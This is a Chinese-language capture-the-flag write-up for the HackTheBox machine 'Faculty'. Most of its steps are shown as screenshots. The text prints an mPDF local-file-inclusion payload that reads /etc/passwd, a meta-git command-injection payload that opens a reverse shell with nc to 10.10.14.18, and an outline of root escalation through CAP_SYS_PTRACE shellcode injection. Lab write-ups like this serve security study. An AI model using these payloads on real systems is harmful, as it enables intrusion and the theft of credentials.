# Faculty

Faculty 是一台中型 Linux 机器，具有 PHP Web 应用程序，该应用程序使用的库容易受到本地文件包含的影响。利用该库中的 LFi 会泄露一个密码，该密码可用于通过 SSH 以名为“gbyolo”的低级用户身份登录。用户“gbyolo”有权作为“developer”用户运行名为“meta-git”的“npm”包。此机器上安装的“meta-git”版本容易受到代码注入攻击，可利用该版本将权限升级到用户“developer”。通过利用“CAP_SYS_PTRACE”功能将 shellcode 注入到以“root”身份运行的进程中，可以将权限提升到“root”。

---

## 外部信息收集

### 端口扫描

循例nmap

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/b8ee983f-c44a-cdda-ea78-7533f6b94fef.png)

### Web枚举

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/a83c9067-9eff-b0e2-465b-b3adf0052c1d.png)

gobuster扫目录

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/8111c374-a9e0-d6cf-6adb-3048292e1bfa.png)

admin/

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/bee5dd5f-3258-a8a7-15a7-fb0df1f4d4c1.png)

这里会转pdf

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/d5823ffa-7fd6-54ed-5718-ba3101c9f8b5.png)

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/40ed8b43-9430-a33c-05b0-a78d56464cf4.png)

download.php，通过html进行url编码后再转base64直接生成pdf

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/95c3bbe1-b5a7-d745-aef8-d06e03445e34.png)

尝试打XHR，但没成功

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/7049f4e4-036c-97c5-ba57-904afef55aed.png)

从pdf属性看到又是mPDF

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/da13edf9-3f62-3daf-c0af-a74eb8a71292.png)

谷歌能找到一个7.0版本的LFI

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/1699caad-4b0d-49fd-76dd-fc4a88b2436f.png)

payload

```html
<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />
```

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/86aba4c9-72d0-77ef-0c25-5844b7571c7e.png)

能读到

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/ea4c743b-15a7-c8cf-1fea-f0acba69dc96.png)

读/etc/nginx/sites-enabled/default

```xaml
server {
	listen 80 default_server;
	listen [::]:80 default_server;

	root /var/www/html;

	# Add index.php to the list if you are using PHP
	index index.html index.htm index.nginx-debian.html;

	server_name _;

	rewrite ^ http://faculty.htb;
}
```

## Foothold

绝对路径找不到真正的网站根目录，但可以相对路径读

login.php

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/81c4570a-b93c-03b8-fde4-55d8f46ee08b.png)

db_connect.php读到一组凭据

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/a16ae6dc-29d0-bcc6-0897-f352a6099a2e.png)

密码重用于gbyolo账户，我们能够通过它登录ssh

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/13e30c6e-a5de-6a7d-9689-fd702bf334ac.png)

## 本地横向移动 -> developer

sudo -l

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/381c680f-869f-ac7a-efb7-3e1f21d55965.png)

在谷歌能够找到一篇meta git会受命令注入漏洞影响的[文章](https://huntr.com/bounties/1-npm-meta-git/)

通过poc，能够执行命令创建文件

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/17008efa-f208-00c4-24fe-fcbfd7d6da1d.png)

reverse shell payload

	'sss||mkfifo /tmp/f1;nc 10.10.14.18 8888 < /tmp/f1 | /bin/bash > /tmp/f1 #'

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/5aff8a34-a439-696d-f7e6-41d11c6b1ec5.png)

## 本地权限提升

getcap

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/550bbfe7-aa77-a6c6-d413-a033fff05369.png)

[HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_ptrace)提供了利用方法

msfvenom生成shellcode

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/de224b1f-3fba-4a5c-095c-7f58105355b3.png)

利用python脚本生成payload

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/1c83d881-4710-3fcc-b333-21319caec86f.png)

gdb

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/3cc23139-6668-67e7-2fbc-25ae64ec3fff.png)

get root

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/d75ae186-d5c0-9d3d-d207-8f821471dd15.png)

